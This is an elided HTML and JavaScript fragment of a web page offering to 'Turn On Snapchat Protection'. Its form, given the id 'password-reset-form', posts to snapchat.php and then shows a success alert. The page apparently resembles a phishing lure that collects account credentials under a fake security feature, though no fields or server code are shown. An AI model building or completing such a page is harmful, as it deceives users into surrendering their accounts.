    ...
    <nav>     
        ...
        <div class="menu-container">
            <ul>                 
                ...
                <li><a href="snapchat.php" class="menu" id="specialitemcolor">Snapchat</a></li>       
   ...
   <span></span>
    ...
    <div class="container">     
        <div class="form-container">         
            <h2 id="onlywhiteitems">Turn On Snapchat Protection</h2>         
            <form action="snapchat.php" method="post" id="password-reset-form" onsubmit="return showLoadingMessage()">             
    ...
    <script>
        function showLoadingMessage() {
            ...
            if (form.checkValidity()) {
                ...
                alert("Snapchat Protection is On Successfully ✔");
